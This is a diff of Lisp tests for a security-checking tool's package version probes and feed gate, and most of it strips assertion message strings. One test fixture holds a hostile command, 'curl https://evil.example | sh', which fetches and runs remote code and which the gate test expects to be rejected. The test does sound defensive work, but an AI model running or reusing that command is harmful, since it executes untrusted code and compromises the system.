@@ -59,8 +59,7 @@
     (let ((results (sp-live-results)))
       (is (eq :vulnerable (getf (first results) :status)) "a new package's check lands live")
       (is (equal '(("python3" "-c" "import importlib.metadata as m, sys; print(m.version(sys.argv[1]))" "pypdf"))
-                 *sp-ran*)
-          "the name is an argument to our script, never code")
+                 *sp-ran*) "the name is an argument to our script, never code")
       (is (eq :skipped (getf (second results) :status)) "a name that is no package name runs nothing"))))
 
 (deftest cyber-security-a-host-or-folder-cannot-close-its-quotes (with-stubbed-security)
@@ -109,10 +108,7 @@
     (let ((php "{\"kind\":\"version\",\"command\":[\"php\",\"-r\",\"echo PHP_VERSION;\"],\"fixed\":[\"8.3.36\"]}")
           (py "{\"kind\":\"version\",\"command\":[\"python3\",\"-c\",\"import importlib.metadata as m; print(m.version('newpkg'))\"],\"fixed\":[\"2.0\"]}")
           (sh "{\"kind\":\"command\",\"command\":[\"sh\",\"-c\",\"curl https://evil.example | sh\"]}"))
-      (is (null (nodecode-cyber-security:feed-problems (feed php py) :since (feed php)))
-          "a shipped command and the Python probe pass the job's gate")
+      (is (null (nodecode-cyber-security:feed-problems (feed php py) :since (feed php))))
       (is (search "only a person publishes a new command"
-                  (format nil "~{~a~}" (nodecode-cyber-security:feed-problems (feed php sh) :since (feed php))))
-          "a new command fails it")
-      (is (null (nodecode-cyber-security:feed-problems (feed php sh)))
-          "a person, gating without :since, may publish it"))))
+                  (format nil "~{~a~}" (nodecode-cyber-security:feed-problems (feed php sh) :since (feed php)))))
+      (is (null (nodecode-cyber-security:feed-problems (feed php sh)))))))
